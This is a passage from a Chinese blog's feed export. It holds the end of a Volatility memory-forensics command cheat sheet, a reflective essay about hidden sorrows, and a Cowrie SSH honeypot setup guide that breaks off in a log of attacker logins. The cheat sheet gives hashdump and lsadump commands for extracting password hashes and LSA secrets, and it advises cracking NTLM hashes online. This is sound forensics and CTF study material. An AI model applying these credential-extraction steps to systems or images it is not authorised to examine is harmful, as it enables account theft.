<h5 id="显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。"><a href="#显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。" class="headerlink" title="显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。"></a>显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。</h5><h4 id="查看用户SID："><a href="#查看用户SID：" class="headerlink" title="查看用户SID："></a>查看用户SID：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; getsids</code></pre>
<h4 id="查看系统中的用户："><a href="#查看系统中的用户：" class="headerlink" title="查看系统中的用户："></a>查看系统中的用户：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K "SAM\Domains\Account\Users\Names"</code></pre>
<h4 id="获取系统中最后登录用户"><a href="#获取系统中最后登录用户" class="headerlink" title="获取系统中最后登录用户"></a>获取系统中最后登录用户</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></pre>
<h4 id="查看启动项："><a href="#查看启动项：" class="headerlink" title="查看启动项："></a>查看启动项：</h4><pre><code>     -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K "Microsoft\Windows\CurrentVersion\Run"</code></pre>
<h4 id="查看动态链接库的信息："><a href="#查看动态链接库的信息：" class="headerlink" title="查看动态链接库的信息："></a>查看动态链接库的信息：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; dlllist [-p pid]</code></pre>
<h5 id="显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。"><a href="#显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。" class="headerlink" title="显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。"></a>显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。</h5><h4 id="查看临时内存注册表信息："><a href="#查看临时内存注册表信息：" class="headerlink" title="查看临时内存注册表信息："></a>查看临时内存注册表信息：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; hivelist
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; lsadump -y SYSTEM的virtualaddr -s SECURITY的virtualaddr

    都是用来查看第二类注册表信息</code></pre>
<h5 id="注册表不是一个简单的大文件，而是一个集合，由称为“注册表文件-hive-”的分散文件组成。"><a href="#注册表不是一个简单的大文件，而是一个集合，由称为“注册表文件-hive-”的分散文件组成。" class="headerlink" title="注册表不是一个简单的大文件，而是一个集合，由称为“注册表文件(hive)”的分散文件组成。"></a>注册表不是一个简单的大文件，而是一个集合，由称为“注册表文件(hive)”的分散文件组成。</h5><h5 id="注册表文件主要包括两类："><a href="#注册表文件主要包括两类：" class="headerlink" title="注册表文件主要包括两类："></a>注册表文件主要包括两类：</h5><h5 id="第一类：存储在磁盘上的静态数据，这类注册表文件一般被保存在操作系统的system32-config文件夹下。一般在运行中使用regedit查看。"><a href="#第一类：存储在磁盘上的静态数据，这类注册表文件一般被保存在操作系统的system32-config文件夹下。一般在运行中使用regedit查看。" class="headerlink" title="第一类：存储在磁盘上的静态数据，这类注册表文件一般被保存在操作系统的system32\config文件夹下。一般在运行中使用regedit查看。"></a>第一类：存储在磁盘上的静态数据，这类注册表文件一般被保存在操作系统的system32\config文件夹下。一般在运行中使用regedit查看。</h5><h5 id="第二类-易失性注册表数据，这类注册表文件是由Windows内核负责维护的RAM中的数据，它们在系统每次启动的时候才会被创建。"><a href="#第二类-易失性注册表数据，这类注册表文件是由Windows内核负责维护的RAM中的数据，它们在系统每次启动的时候才会被创建。" class="headerlink" title="第二类;易失性注册表数据，这类注册表文件是由Windows内核负责维护的RAM中的数据，它们在系统每次启动的时候才会被创建。"></a>第二类;易失性注册表数据，这类注册表文件是由Windows内核负责维护的RAM中的数据，它们在系统每次启动的时候才会被创建。</h5><h4 id="hivelist："><a href="#hivelist：" class="headerlink" title="hivelist："></a>hivelist：</h4><h5 id="定位与硬盘上对应的注册表文件在内存中的虚拟地址和物理地址。特别是当你想打印某个注册表文件的值时，就需要先运行这个命令。"><a href="#定位与硬盘上对应的注册表文件在内存中的虚拟地址和物理地址。特别是当你想打印某个注册表文件的值时，就需要先运行这个命令。" class="headerlink" title="定位与硬盘上对应的注册表文件在内存中的虚拟地址和物理地址。特别是当你想打印某个注册表文件的值时，就需要先运行这个命令。"></a>定位与硬盘上对应的注册表文件在内存中的<strong>虚拟地址</strong>和<strong>物理地址</strong>。特别是当你想打印某个注册表文件的值时，就需要先运行这个命令。</h5><h4 id="lsadump："><a href="#lsadump：" class="headerlink" title="lsadump："></a>lsadump：</h4><h5 id="使用lsadump命令可以读取注册表中的与本地安全授权相关的秘密数据。"><a href="#使用lsadump命令可以读取注册表中的与本地安全授权相关的秘密数据。" class="headerlink" title="使用lsadump命令可以读取注册表中的与本地安全授权相关的秘密数据。"></a>使用lsadump命令可以读取注册表中的与本地安全授权相关的秘密数据。</h5><h5 id="LSA-Local-Security-Authority-即本地安全授权。Windows系统中一个相当重要的服务，所有安全认证相关的处理都要通过这个服务。比如系统自动登录的缺省密码、远程桌面协议的公钥、Windows数据保护应用程序编程接口使用的授权证书等信息。"><a href="#LSA-Local-Security-Authority-即本地安全授权。Windows系统中一个相当重要的服务，所有安全认证相关的处理都要通过这个服务。比如系统自动登录的缺省密码、远程桌面协议的公钥、Windows数据保护应用程序编程接口使用的授权证书等信息。" class="headerlink" title="LSA(Local Security Authority)即本地安全授权。Windows系统中一个相当重要的服务，所有安全认证相关的处理都要通过这个服务。比如系统自动登录的缺省密码、远程桌面协议的公钥、Windows数据保护应用程序编程接口使用的授权证书等信息。"></a>LSA(Local Security Authority)即本地安全授权。Windows系统中一个相当重要的服务，所有安全认证相关的处理都要通过这个服务。比如系统自动登录的缺省密码、远程桌面协议的公钥、Windows数据保护应用程序编程接口使用的授权证书等信息。</h5><h5 id="使用该命令的时候，需要把上文提到的SYSTEM注册表的虚拟地址作为-y选项的参数和SECURITY注册表文件的地址作为-s选项的参数"><a href="#使用该命令的时候，需要把上文提到的SYSTEM注册表的虚拟地址作为-y选项的参数和SECURITY注册表文件的地址作为-s选项的参数" class="headerlink" title="使用该命令的时候，需要把上文提到的SYSTEM注册表的虚拟地址作为-y选项的参数和SECURITY注册表文件的地址作为-s选项的参数."></a>使用该命令的时候，需要把上文提到的SYSTEM注册表的虚拟地址作为-y选项的参数和SECURITY注册表文件的地址作为-s选项的参数.</h5><pre><code>    -f &lt;memdump.img&gt; --profile=&lt;prifile&gt; lsadump -y SYSTEM的virtualaddr -s SECURE的virtualaddr</code></pre>
<h4 id="获取注册表信息以爆破密码："><a href="#获取注册表信息以爆破密码：" class="headerlink" title="获取注册表信息以爆破密码："></a>获取注册表信息以爆破密码：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; hashdump -y SYSTEM的virtualaddr -s SAM的virtualaddr</code></pre>
<h5 id="之后就能看到用户名和两个hash值，选后面那个hash值，用www-cmd5-com-搜索hash转文字，用NTLM来查SAM中的hash。"><a href="#之后就能看到用户名和两个hash值，选后面那个hash值，用www-cmd5-com-搜索hash转文字，用NTLM来查SAM中的hash。" class="headerlink" title="之后就能看到用户名和两个hash值，选后面那个hash值，用www.cmd5.com 搜索hash转文字，用NTLM来查SAM中的hash。"></a>之后就能看到用户名和两个hash值，选后面那个hash值，用<a href="http://www.cmd5.com/">www.cmd5.com</a> 搜索hash转文字，用NTLM来查SAM中的hash。</h5><h4 id="查看历史命令："><a href="#查看历史命令：" class="headerlink" title="查看历史命令："></a>查看历史命令：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; cmdscan</code></pre>
<h4 id="查看控制台命令："><a href="#查看控制台命令：" class="headerlink" title="查看控制台命令："></a>查看控制台命令：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; consoles</code></pre>
<h4 id="查看网络连接（TCP连接）："><a href="#查看网络连接（TCP连接）：" class="headerlink" title="查看网络连接（TCP连接）："></a>查看网络连接（TCP连接）：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; connections           Vista前的系统用的
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; netscan                 Vista后的系统用的</code></pre>
<h4 id="查看IE历史："><a href="#查看IE历史：" class="headerlink" title="查看IE历史："></a>查看IE历史：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; iehistory</code></pre>
<h4 id="获取用户密码散列"><a href="#获取用户密码散列" class="headerlink" title="获取用户密码散列:"></a>获取用户密码散列:</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; hashdump(-y systemadd –s samadd)</code></pre>
<h4 id="获取内存中活跃的TCP连接"><a href="#获取内存中活跃的TCP连接" class="headerlink" title="获取内存中活跃的TCP连接"></a>获取内存中活跃的TCP连接</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; connections</code></pre>
<h4 id="查看系统中已打开的文件（rootkit隐藏文件）"><a href="#查看系统中已打开的文件（rootkit隐藏文件）" class="headerlink" title="查看系统中已打开的文件（rootkit隐藏文件）"></a>查看系统中已打开的文件（rootkit隐藏文件）</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; filescan</code></pre>
<h4 id="导出相关filescan的文件"><a href="#导出相关filescan的文件" class="headerlink" title="导出相关filescan的文件"></a>导出相关filescan的文件</h4><pre><code>    -f file_patched.dmp --profile=Win7SP1x86_23418 dumpfiles -D ./ -Q 0x000000000e080690</code></pre>
<h4 id="显示在一个进程中打开的句柄"><a href="#显示在一个进程中打开的句柄" class="headerlink" title="显示在一个进程中打开的句柄"></a>显示在一个进程中打开的句柄</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; handles -p &lt;pid&gt; -t &lt;file&gt;</code></pre>
<h4 id="显示内核中的驱动程序，包括已隐藏-链接的"><a href="#显示内核中的驱动程序，包括已隐藏-链接的" class="headerlink" title="显示内核中的驱动程序，包括已隐藏/链接的"></a>显示内核中的驱动程序，包括已隐藏/链接的</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; modules
    查看内核驱动（不全）
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; modscan
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; driverscan</code></pre>
<h4 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; svcscan</code></pre>
<h4 id="查看各组件时间线"><a href="#查看各组件时间线" class="headerlink" title="查看各组件时间线"></a>查看各组件时间线</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; timeliner
    输出一般很多，建议输出到制定文件中</code></pre>
<h4 id="查看系统或桌面执行文件的信息。"><a href="#查看系统或桌面执行文件的信息。" class="headerlink" title="查看系统或桌面执行文件的信息。"></a>查看系统或桌面执行文件的信息。</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; userassist

   包括  ：名称、路径、执行次数、最后一次执行时间等</code></pre>
<h4 id="将内存中的某个进程数据以-dmp-的格式保存出来"><a href="#将内存中的某个进程数据以-dmp-的格式保存出来" class="headerlink" title="将内存中的某个进程数据以 dmp 的格式保存出来"></a>将内存中的某个进程数据以 dmp 的格式保存出来</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; memdump -p [PID] -D [dump 出的文件保存的目录]
    举例：
    volatility -f mem.vmem --profile=WinXPSP2x86 memdump -p 1734 -D ctf/


    hexdump 1734.dmp
    二进制编辑器 hexeditor 将以上保存的 dmp 文件打开，并进行调查取证的工作。


    你还可以使用 strings 这个工具将它的字符串打印出来。例：

    strings 1736.dmp &gt; 1736.txt
    strings 1608.dmp &gt; 1736.txt | grep shellcode</code></pre>
<p>–cache选项的功能是使用缓存。<br>–dtb=DTB选项的功能是说明DTB(Directory Table Base)页目录表的基地址。<br>-k KPCR 选项的功能是说明一个指定的内核处理器控制区的虚拟地址。<br>Apihooks插件命令的功能是监测在进程和内核中的API钩子。<br>Bioskbd插件命令的功能是动态地从内存中读取键盘缓冲区的数据。</p>
<p><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">命令行指南</a></p>
<p>附上一篇好文章，其中有一些典型的题目可以参考，日后感兴趣的可以做做。<br><a href="http://shaobaobaoer.cn/archives/693/memory-forensics-tool-volatility-usage-and-practice">传送门</a></p>
<p>另外加上一篇<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html">USB流量分析文章</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <tags>
        <tag>取证</tag>
        <tag>内存</tag>
        <tag>volatility</tag>
      </tags>
  </entry>
  <entry>
    <title>你藏了那么多，一定很辛苦吧</title>
    <url>/titled.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p>每隔一段时间，我都会清理我的抽屉。</p>
<p>里面堆满了各种物件：票根、便签、卡片、瓶子、信件、药片……它们散落在抽屉的各个角落，像围成一撮撮的孩童，带着我在某段旅程中的故事隐藏在这里，所有逝去的时间也都住在这里。如果不打开这些大大小小的抽屉，它们就会被我悉数遗忘。</p>
<p>几张往返于北京与重庆的登机牌，边角卷了，牌面上的数字也已有些模糊不清，但当初的情景还浮现在脑海中。在入冬的北京，一个人拖着装满梦想的行李箱，走过后海、公主坟、建国门外大街。黄昏，抬头，看见天空阴翳，偶尔有一群鸽子或乌鸦鸣叫而过。我瑟缩着手脚，蹲在路边，一无所获，只有口中呵出的寒气正开始流浪。</p>
<p>一颗西服上的黑色纽扣滑到抽屉边角，它放到这里多久了？三年前，在西门町的一家卖场买下了那件足够半个月生活费的西服，去参加交换生结束晚宴。出门前，我一不留神被椅子绊倒，衣服被撕扯开，扣子掉了出来。我去宿管那里借来针线，手太笨，针尖扎破了手指，忍着眼泪继续缝补。后来勉强穿上，去赴宴。回来，扣子还是掉了，好似铁了心要诀别的恋人。握着它，手里一阵辛酸。</p>
<p>还有医院体检费用的发票、曾经某个人别在我衣上的胸章、从国外寄来末尾都写了一句“祈愿顺遂”的明信片……这些旧物件都保留着自己走来的路径，那些绝口不再提起的遭遭往事、风月离合。抽屉悄然间竟藏了这么多，怪累的，自己把它们倒出，挑些仍放不下的又重新放进。</p>
<p>“11月11日凌晨2点08分，多伦多已经充满凉意，我坐在窗边读了一会儿阿特伍德的《盲刺客》，泛着微霜似的字句像昨夜留下的残羹冷炙，舌苔轻轻触碰，就觉得唇寒齿冻。好多往事太过潮湿，不敢去碰，太冷。一个人只想坐在沙发上，关上灯，隐没在夜色里，没有比这更安全的了。”</p>
<p>一天夜里看到友人G在网络空间上发的状态，感觉冬天提前来了。六年前，认识了G，那时他刚刚硕士毕业，有一个长相甜美、脑瓜机灵的女朋友，两人约好去国外念书，然后移民。这样的故事太理想，结局往往并不好。在多伦多，G失去了青春时的那一半。寒风肆虐，他独自站在东约克广场上，跟我通了一次远洋电话，之后自顾自低头抽烟。</p>
<p>太多人在不尽如人意的世事面前，独自承担，选择隐藏，然后遗忘，性情愈发淡漠。但真能忘掉吗？当然不能，否则世间也不会有这么多的痴男怨女。</p>
<p>刚来大学教书那会儿，我像进入新世界一样充满热情，做每件事似乎都有使不完的劲儿，跟每个学生处起来就像朋友一样。</p>
<p>同事L反复提醒我，要保持跟学生的距离，太近了总会出问题。我当然不以为然，后来碰到借给学生钱对方不还、在路上与学生擦肩而过对方竟装作陌生人不打招呼、上课为了学生学得有趣降低授课难度而对方沉溺于手机视频游戏、期末监考发现与自己日常互动频繁的学生在作弊，这些情况使我理解了L。</p>
<p>像他这样教龄高的同事在学生面前严肃、漠然、谨慎的原因，多半是因为初来乍到时吃过亏，于是他们收起天真，收起笑容，学会隐藏自己的情绪，不让学生看到。</p>
<p>我不擅长处理人世关系，在一个僵局里待久了，我会选择离开，前往新的地方，住一段时间，放空自己，像个被及时清空的抽屉，可以安放新的事物。即便往后故地重游，抽屉里又塞进旧物，但它仍有空间腾给余生。</p>
<p>有天，看见日历上的数字，发觉自己教书已近三年。</p>
<p>在这三年里，整个人除了应对繁忙的工作、处理跟学生的关系、对领导察言观色、与三四好友共饮悲喜，之外便再无任何变化。生活像头疲倦的骆驼，让我感到恐慌。</p>
<p>我决定瞒着家人，离开工作的地方，去透透气。</p>
<p>在双廊住了段时间，每天早上自己一起身便打开窗看看洱海。房间采光很好，中午热起来的时候，就从书架上挑一本书，光着身子趴在竹席上读。落进来的光线一会儿坐在桌上，一会儿撤到墙角，很多次，白天就这样一晃而过。</p>
<p>日落苍山，我不动声色看着外面的一切：黑瓦、灰墙、朱红色的木窗、不远处波光粼粼的水面。斜到山顶的夕阳余晖，预示着一切喧嚣的、灿烂的终究被夜色取代，遗忘。一个人又有什么放不下的？</p>
<p>在趋向淡季的日子里，与我同住一家旅馆的是个上海姑娘。老板说她在这里住了快两周了，不怎么跟人打交道，一个人待在屋子里看书写字，偶尔出来划船、骑自行车、采些沿途的野花回来，也都是一个人。她在这里，过着非常单纯的生活。</p>
<p>我猜想着她之前所经历的生活，一定非常煎熬，挣扎，无奈，甚至颠沛流离，否则她怎会独自来到这里，毕竟做出这样的决定，她要面对很多、放弃很多、反抗很多。可能这居所只能短住几天，但远离俗世、把自己藏于山川湖海的决定的确能让人释然，内心无比清爽。</p>
<p>每个人的内心都有一片天地是留给自己的，但太多人的世界都已被琐碎占满，隐藏在心底的悲伤越来越多，戴的面具越来越重，属于生命愉悦的那一部分都荡然无存。</p>
<p>及时放下，像码头上的货轮抵港就卸下沉重的集装箱。</p>
<p>不要再穿着紧绷的西装端着高脚杯笑脸盈盈走向一群冷脸的人，不要再替只想做政绩而不顾员工感受的领导透支生命，不要再去反复温习为理想奔波而郁郁不得志的艰难岁月，不要再为一段无果的感情默默隐忍、做无谓的牺牲，</p>
<p>你藏起那么多别人无法知晓的悲哀忧愁，也藏起了一个真实的自我，最后只是在与真正的自己背道而驰，埋葬了青春，辜负了人生。</p>
<p>及时清理，给抽屉该有的空间，去收纳未来。</p>
<p>没有什么要藏一辈子，也没有什么可以藏一辈子。那么辛苦，不值得。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>美文</category>
      </categories>
      <tags>
        <tag>美文</tag>
        <tag>文苑</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>Cowrie蜜罐简单尝试</title>
    <url>/Cowrie%E8%9C%9C%E7%BD%90%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>对Cowrie早有耳闻，一直念念不忘，今天忙里偷闲，查阅官方文档，结合网上教程，中途采坑无数，终成功搭建。现将搭建过程一一呈现。</p>
<p>因为是捕获攻击行为，所以我们首先得有一台欧洲附近的VPS，我就在vultr上选择了一台法国主机。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>OS：ubuntu 16.04</p>
<p>ip：80.240.20.182</p>
<p>address：France</p>
<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="抬高默认SSH端口"><a href="#抬高默认SSH端口" class="headerlink" title="抬高默认SSH端口"></a>抬高默认SSH端口</h3><p>在安装Cowrie之前首先将修改默认的ssh端口<code>22</code>让出来，编辑 <code>#Port 22</code> 修改为 <code>Port 22222</code></p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/sshd_config</span><br><span class="line"></span><br><span class="line">修改为 <span class="number">22222</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重新启动ssh服务</span></span><br><span class="line"><span class="regexp">/etc/i</span>nit.d/ssh restart</span><br><span class="line"></span><br><span class="line">断开连接，重新连接ssh，注意，端口已经改为<span class="number">22222</span>。</span><br></pre></td></tr></tbody></table></figure>

<h3 id="安装依赖项"><a href="#安装依赖项" class="headerlink" title="安装依赖项"></a>安装依赖项</h3><p>安装Python3的依赖项</p>
<figure class="highlight q"><table><tbody><tr><td class="code"><pre><span class="line">apt install git python-virtualenv libssl-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> build-essential libpython3-<span class="built_in">dev</span> python3-minimal authbind virtualenv</span><br></pre></td></tr></tbody></table></figure>

<p>安装Python2的依赖项</p>
<figure class="highlight q"><table><tbody><tr><td class="code"><pre><span class="line">apt install git python-virtualenv libssl-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> build-essential libpython-<span class="built_in">dev</span> python2<span class="number">.7</span>-minimal authbind</span><br></pre></td></tr></tbody></table></figure>

<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight mipsasm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">adduser </span>--<span class="keyword">disabled-password </span>cowrie</span><br><span class="line">su - cowrie</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h3 id="git代码"><a href="#git代码" class="headerlink" title="git代码"></a>git代码</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">git clone http:<span class="regexp">//gi</span>thub.com<span class="regexp">/cowrie/</span>cowrie</span><br><span class="line">cd cowrie</span><br></pre></td></tr></tbody></table></figure>

<h3 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h3><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">pwwd</span><br><span class="line">virtualenv <span class="attribute">--python</span>=python3 cowrie-env</span><br><span class="line"><span class="comment">#或者创建Python2的虚拟环境</span></span><br><span class="line">virtualenv <span class="attribute">--python</span>=python2 cowrie-env</span><br></pre></td></tr></tbody></table></figure>

<p>激活环境并安装包：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">source cowrie-env/bin/activate</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade -r requirements.txt</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="创建并修改配置文件"><a href="#创建并修改配置文件" class="headerlink" title="创建并修改配置文件"></a>创建并修改配置文件</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>etc/</span><br><span class="line">cp cowrie.cfg.dist cowrie.cfg</span><br><span class="line">vim cowrie.cfg</span><br><span class="line"><span class="comment">#修改default name 为 Django</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>注意，cowrie的ssh默认端口是2222。</p>
<h3 id="启动Cowrie"><a href="#启动Cowrie" class="headerlink" title="启动Cowrie"></a>启动Cowrie</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span></span><br><span class="line">.<span class="regexp">/bin/</span>cowrie start</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222</span><br></pre></td></tr></tbody></table></figure>

<p>为什么选择cowrie的默认SSH端口2222，然后端口转发到22，而不是直接修改cowrie的ssh监听22端口为22。<br>因为，在启动cowrie的时候是以cowrie的普通用户权限执行的，而普通用户不能直接开放1024以内的端口。但是我们又不能用root权限启动cowrie，两者自相矛盾。</p>
<h3 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">tail -f <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>var<span class="regexp">/log/</span>cowrie/cowrie.json</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>查看登录成功的记录：</p>
<figure class="highlight gradle"><table><tbody><tr><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>var<span class="regexp">/log/</span>cowrie/cowrie.json | <span class="keyword">grep</span> success</span><br><span class="line"></span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.164"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:03.511816Z"</span>,<span class="string">"session"</span>:<span class="string">"86db2c24adca"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.210"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:05.757924Z"</span>,<span class="string">"session"</span>:<span class="string">"ccf709714130"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.169"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:10.460597Z"</span>,<span class="string">"session"</span>:<span class="string">"83c13f52700e"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.169"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:34.359839Z"</span>,<span class="string">"session"</span>:<span class="string">"7758eebae3a3"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"193.32.161.176"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:35.328376Z"</span>,<span class="string">"session"</span>:<span class="string">"6dd4c70d1f51"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.220"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:06:33.090110Z"</span>,<span class="string">"session"</span>:<span class="string">"df7da3aa3ca1"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.210"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:06:36.753434Z"</span>,<span class="string">"session"</span>:<span class="string">"d567119597cd"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.169"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span 